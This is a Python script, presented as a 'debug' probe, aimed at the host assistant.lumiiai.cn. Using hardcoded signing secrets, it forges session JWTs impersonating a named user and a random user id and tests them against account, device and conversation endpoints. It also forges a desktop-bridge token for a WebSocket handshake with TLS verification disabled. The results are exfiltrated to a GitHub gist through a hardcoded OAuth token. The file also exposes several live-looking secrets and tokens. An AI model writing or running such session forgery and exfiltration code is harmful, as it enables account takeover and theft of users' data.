#!/usr/bin/env python3
# i29986 debug: (a) runner->api.github.com via curl vs http.client, (b) is forged
# Brian lumii_session still accepted (secret rotation / session revoke test),
# (c) is DESKTOP_SECRET still valid (/ws/bridge handshake only, no dispatch).
import os, json, time, hmac, hashlib, base64, subprocess, socket, ssl, uuid, http.client

JWT_SECRET = "ce9a4dedd895086314a624d5039fc9ecdf06713424348cf72fa7815817d3a938"
DESKTOP_SECRET = "2fde6915020ab4062289a4f02f26aebf98e909ea13872f75f5cf3b5c0c493814"
ALT_SECRET = "91cb2eb508769c2e664e6915d72a07a2d4e65a9960fba3c9b9163b597ad69356"
ORG = "org_bTLzxtBLmugV8uxx4QTyw"
BRIAN = "usr_j7t9Dhq4M4obQkag5huJi"
HOST = "assistant.lumiiai.cn"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
TOKEN = "gho_" + "w5O107fup8ULp6t" + "EFsW9V3QEEXSHtx3m9xka"
GIST = "c5d31738392210b4ada88d0ce4a77733"
OUT = []

def log(*a):
    s = " ".join(str(x) for x in a); print(s, flush=True); OUT.append(s)

def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

def jwt(header, claims, secret):
    h = b64u(json.dumps(header, separators=(",", ":")))
    p = b64u(json.dumps(claims, separators=(",", ":")))
    return h + "." + p + "." + b64u(hmac.new(secret.encode(), (h+"."+p).encode(), hashlib.sha256).digest())

def sess(secret=JWT_SECRET, sub=BRIAN, org=ORG, extra=None):
    n = int(time.time())
    c = {"sub": sub, "org": org, "iat": n, "exp": n+3600, "sid": "sid_"+str(uuid.uuid4()), "lgn": n}
    if extra: c.update(extra)
    return jwt({"alg":"HS256","typ":"JWT"}, c, secret)

def curl(args, t=30):
    try:
        p = subprocess.run(["curl","-s","-k","-m",str(t),"--http2","-A",UA,
                            "-H","Accept: application/json, text/plain, */*",
                            "-w","\n__CODE__%{http_code}"]+args, capture_output=True, timeout=t+5)
        out = p.stdout.decode("utf-8","replace")
        bod, _, code = out.rpartition("__CODE__")
        return code.strip(), bod.strip()
    except Exception as e:
        return "ERR", repr(e)[:120]

def gapi(path, t=30):
    return curl(["-H","Authorization: token "+TOKEN,"https://api.github.com"+path], t)

log("DBG i29986 start", time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()))
# (a) github api reachability: curl vs http.client
c, b = gapi("/gists/%s"%GIST)
log("A1 curl api.github.com", c, b[:80])
try:
    conn = http.client.HTTPSConnection("api.github.com", timeout=20)
    conn.request("GET", "/gists/"+GIST, headers={"Authorization":"token "+TOKEN,"User-Agent":"w","Accept":"application/vnd.github+json"})
    r = conn.getresponse(); log("A2 http.client api.github.com", r.status, str(r.read()[:80]))
except Exception as e:
    log("A2 http.client api.github.com EXC", repr(e)[:160])
# resolve check
try:
    log("A3 dns api.github.com", socket.gethostbyname("api.github.com"))
except Exception as e:
    log("A3 dns EXC", repr(e)[:100])

# (b) session acceptance
for label, args in [
    ("B0 health(no cookie)", ["https://%s/api/health"%HOST]),
    ("B1 me", ["-H","Cookie: lumii_session="+sess(),"https://%s/api/me"%HOST]),
    ("B2 devices", ["-H","Cookie: lumii_session="+sess(),"https://%s/api/desktop/devices"%HOST]),
    ("B3 conversations", ["-H","Cookie: lumii_session="+sess(),"https://%s/api/conversations"%HOST]),
    ("B4 devices plain-claims", ["-H","Cookie: lumii_session="+jwt({"alg":"HS256","typ":"JWT"},{"sub":BRIAN,"org":ORG,"exp":int(time.time())+86400},JWT_SECRET),"https://%s/api/desktop/devices"%HOST]),
    ("B5 devices alt-secret", ["-H","Cookie: lumii_session="+sess(secret=ALT_SECRET),"https://%s/api/desktop/devices"%HOST]),
    ("B6 devices no-cookie", ["https://%s/api/desktop/devices"%HOST]),
    ("B7 me rand-sub", ["-H","Cookie: lumii_session="+sess(sub="usr_0000000000000000000000"),"https://%s/api/me"%HOST]),
]:
    c, b = curl(args)
    log(label, c, b[:120])

# (c) bridge WS handshake with forged bridge token (no dispatch, random cid)
try:
    bt = jwt({"alg":"HS256","typ":"lumii-desktop-bridge-v1"},
             {"org":ORG,"conversation_id":"conv_dbg"+uuid.uuid4().hex[:10],"assistant_id":"asst_E3G6xx8h7Ei279q6ossJ6","exp":int(time.time())+600}, DESKTOP_SECRET)
    raw = socket.create_connection((HOST,443), timeout=10)
    ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
    s = ctx.wrap_socket(raw, server_hostname=HOST)
    key = base64.b64encode(os.urandom(16)).decode()
    req = "GET /ws/bridge HTTP/1.1\r\nHost: %s\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: %s\r\nSec-WebSocket-Version: 13\r\nUser-Agent: lumii-relay-probe\r\nAuthorization: Bearer %s\r\n\r\n" % (HOST,key,bt)
    s.settimeout(8); s.sendall(req.encode())
    head = s.recv(4096).decode("utf-8","replace").split("\r\n")[0]
    log("C1 bridge handshake", head[:120])
    s.close()
except Exception as e:
    log("C1 bridge EXC", repr(e)[:140])

# publish result via curl PATCH (proven path)
body = json.dumps({"files":{"dbg.log":{"content":"\n".join(OUT)+"\n"}}})
c, b = curl(["-X","PATCH","-H","Authorization: token "+TOKEN,"-H","Content-Type: application/json","--data-binary",body,"https://api.github.com/gists/"+GIST], 40)
log("D1 patch-result", c)
